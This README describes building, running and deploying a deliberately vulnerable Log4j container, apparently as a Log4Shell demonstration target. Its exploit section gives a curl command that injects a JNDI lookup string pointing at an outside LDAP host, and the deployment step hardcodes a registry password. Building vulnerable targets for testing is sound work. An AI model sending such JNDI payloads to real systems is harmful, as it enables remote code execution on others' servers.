# Log4shell vulnerable image

## Build

Compile sources.

```sh
(cd src && ./mvnw package -DskipTests=true)
```

Package the container image.

```sh
buildah build -t vulnerable-log4j:latest .
```

Push the image to the registry of your choice.

```sh
podman tag localhost/vulnerable-log4j:latest registry.itix.xyz/vulnerable/vulnerable-log4j:latest
podman push registry.itix.xyz/vulnerable/vulnerable-log4j:latest
```

## Usage

```sh
podman run -d -p 8080:8080 --rm --name vulnerable-log4j vulnerable-log4j:latest
export TARGET=http://localhost:8080/
```

```
sh-4.1# curl "$TARGET" -H "X-Name: Nicolas"
Hello, Nicolas!
sh-4.1# curl "$TARGET"
Hello, World!
```

## Deployment

```sh
oc apply -f openshift/
oc project vulnerable-log4j
oc create secret docker-registry itix-registry --docker-server=registry.itix.xyz --docker-username=admin --docker-password=s3cr3t --docker-email=nmasse@redhat.com
oc secrets link default itix-registry --for=pull
```

## Exploit

Find the URL of the vulnerable container.

```sh
export TARGET="https://$(oc get route apiserver -n vulnerable-log4j -o jsonpath="{.spec.host}")/"
```

Go to https://log4shell.huntress.com/ and pass the generated string in the `X-Name` HTTP header.

```sh
curl "$TARGET" -H 'X-Name: ${jndi:ldap://log4shell.huntress.com:1389/e597d75d-1851-4133-9a08-d5dfd7e04264}'
```
